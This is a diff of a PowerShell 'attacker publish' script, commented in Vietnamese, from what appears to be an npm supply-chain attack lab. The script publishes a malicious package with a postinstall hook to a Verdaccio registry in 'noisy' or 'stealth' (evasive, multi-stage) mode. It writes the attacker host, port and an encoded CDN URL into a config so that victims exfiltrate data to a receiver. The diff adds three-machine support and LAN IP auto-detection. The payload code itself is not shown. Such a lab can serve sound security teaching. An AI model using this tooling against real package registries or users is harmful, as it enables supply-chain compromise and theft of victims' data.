@@ -10,25 +10,46 @@
     -Mode noisy    : dùng postinstall-ci-attack.js (everything in 1 file, easy to detect)
     -Mode stealth  : dùng postinstall-stealth.js (multi-stage, evades IOC-1)
 
-  Usage:
-    .\1-attacker-publish.ps1                 # default: noisy mode
-    .\1-attacker-publish.ps1 -Mode noisy     # explicit noisy
-    .\1-attacker-publish.ps1 -Mode stealth   # multi-stage evasion
+  Usage (3-machine — khuyến nghị):
+    .\1-attacker-publish.ps1 -AttackerHost 192.168.x.C
+    .\1-attacker-publish.ps1 -AttackerHost 192.168.x.C -Mode stealth
+    .\1-attacker-publish.ps1 -AttackerHost 192.168.x.C -Mode noisy
+
+  Usage (auto-detect LAN IP):
+    .\1-attacker-publish.ps1        # tự detect, default noisy
+
+  Yêu cầu: Verdaccio + receiver.js đang chạy trên máy này.
+    Chạy trước: .\scripts\start-attacker-services.ps1
 #>
 
 param(
     [ValidateSet("noisy", "stealth")]
     [string]$Mode = "noisy",
 
-    # IP LAN của máy attacker — victim sẽ exfil về IP này.
-    # Mặc định: 172.30.0.20 (Docker bridge — demo 1 máy)
-    # 2-máy: truyền vào IP LAN thật, ví dụ: -AttackerHost 192.168.1.100
-    [string]$AttackerHost = "172.30.0.20",
+    # IP LAN của máy attacker (Machine C) — victim sẽ exfil về IP này.
+    # 3-machine: truyền IP LAN thật: -AttackerHost 192.168.1.100
+    # Để trống: script tự detect LAN IP của máy hiện tại
+    [string]$AttackerHost = "",
     [int]$AttackerPort = 8080
 )
 
 $ErrorActionPreference = "Stop"
 $root = Split-Path -Parent $PSScriptRoot
+
+# Auto-detect LAN IP nếu AttackerHost không được truyền vào
+if ([string]::IsNullOrEmpty($AttackerHost)) {
+    $lanIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
+        $_.InterfaceAlias -notmatch "Loopback|Bluetooth|vEthernet|WSL" -and
+        $_.IPAddress -notmatch "^169\." -and $_.IPAddress -ne "127.0.0.1"
+    } | Sort-Object PrefixLength -Descending | Select-Object -First 1).IPAddress
+    if ($lanIP) {
+        $AttackerHost = $lanIP
+        Write-Host "[AUTO] Detected LAN IP: $AttackerHost  (dùng -AttackerHost <IP> để override)" -ForegroundColor Cyan
+    } else {
+        $AttackerHost = "localhost"
+        Write-Host "[WARN] Không detect được LAN IP → dùng localhost. Victim trên máy khác sẽ KHÔNG exfil được." -ForegroundColor Yellow
+    }
+}
 
 Write-Host "═" * 60 -ForegroundColor Red
 Write-Host "[ATTACKER] Publishing malicious package (mode: $Mode)" -ForegroundColor Red
@@ -36,38 +57,37 @@ Write-Host "═" * 60 -ForegroundColor Red
 Write-Host ""
 
 # ───────────────────────────────────────────────────────────────────────────
-# Bước 1: Start infrastructure (Verdaccio + Attacker receiver)
+# Bước 1: Kiểm tra Verdaccio + receiver đang chạy trên máy này
 # ───────────────────────────────────────────────────────────────────────────
-Write-Host "[1/3] Starting Verdaccio registry + Attacker receiver..." -ForegroundColor Yellow
+Write-Host "[1/3] Checking attacker services..." -ForegroundColor Yellow
 
-Push-Location $root
-docker compose -f docker-compose.verdaccio.yml up -d --build
-Start-Sleep -Seconds 5
+$verdaccioOk = $false
+$receiverOk  = $false
 
-# Wait for Verdaccio
-$maxRetry = 6
-for ($i = 1; $i -le $maxRetry; $i++) {
-    try {
-        $null = Invoke-WebRequest -Uri "http://localhost:4873" -UseBasicParsing -TimeoutSec 3
-        Write-Host "  Verdaccio: OK (http://localhost:4873)" -ForegroundColor Green
-        break
-    } catch {
-        if ($i -eq $maxRetry) { Write-Host "  Verdaccio: TIMEOUT" -ForegroundColor Red; exit 1 }
-        Write-Host "  Verdaccio: waiting... ($i/$maxRetry)" -ForegroundColor Yellow
-        Start-Sleep -Seconds 3
-    }
-}
-
-# Wait for Attacker receiver
 try {
-    $null = Invoke-WebRequest -Uri "http://localhost:8080/beacon" -UseBasicParsing -TimeoutSec 3
-    Write-Host "  Attacker receiver: OK (172.30.0.20:8080)" -ForegroundColor Green
+    $null = Invoke-WebRequest -Uri "http://localhost:4873" -UseBasicParsing -TimeoutSec 3
+    Write-Host "  Verdaccio : OK  → http://localhost:4873" -ForegroundColor Green
+    $verdaccioOk = $true
 } catch {
-    Write-Host "  Attacker receiver: waiting..." -ForegroundColor Yellow
-    Start-Sleep -Seconds 3
+    Write-Host "  Verdaccio : NOT RUNNING" -ForegroundColor Red
 }
-Write-Host "  Network: Victim (host) → Attacker (172.30.0.20, Docker bridge)" -ForegroundColor DarkYellow
-Pop-Location
+
+try {
+    $null = Invoke-WebRequest -Uri "http://localhost:${AttackerPort}/beacon" -UseBasicParsing -TimeoutSec 3
+    Write-Host "  Receiver  : OK  → http://localhost:${AttackerPort}" -ForegroundColor Green
+    $receiverOk = $true
+} catch {
+    Write-Host "  Receiver  : NOT RUNNING" -ForegroundColor Red
+}
+
+if (-not $verdaccioOk -or -not $receiverOk) {
+    Write-Host ""
+    Write-Host "  ERROR: Service chưa chạy. Khởi động trước:" -ForegroundColor Red
+    Write-Host "    .\scripts\start-attacker-services.ps1" -ForegroundColor Yellow
+    exit 1
+}
+
+Write-Host "  Network: Victim → Attacker ($AttackerHost`:$AttackerPort)" -ForegroundColor DarkYellow
 
 # ───────────────────────────────────────────────────────────────────────────
 # Bước 2: Configure malicious package.json based on mode
@@ -117,9 +137,7 @@ $cdnBase64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($cdnUrl))
 $cfg = @{ host = $AttackerHost; port = $AttackerPort; cdn = $cdnBase64 }
 $cfg | ConvertTo-Json | Set-Content $cfgPath -Encoding UTF8
 Write-Host "  Attacker host: ${AttackerHost}:${AttackerPort} (encoded in config.json)" -ForegroundColor DarkYellow
-if ($AttackerHost -ne "172.30.0.20") {
-    Write-Host "  [2-MACHINE] Victim will exfil to LAN IP: $AttackerHost" -ForegroundColor Cyan
-}
+Write-Host "  [3-MACHINE] Victim sẽ exfil về: $AttackerHost" -ForegroundColor Cyan
 
 # ───────────────────────────────────────────────────────────────────────────
 # Bước 3: Publish lên Verdaccio
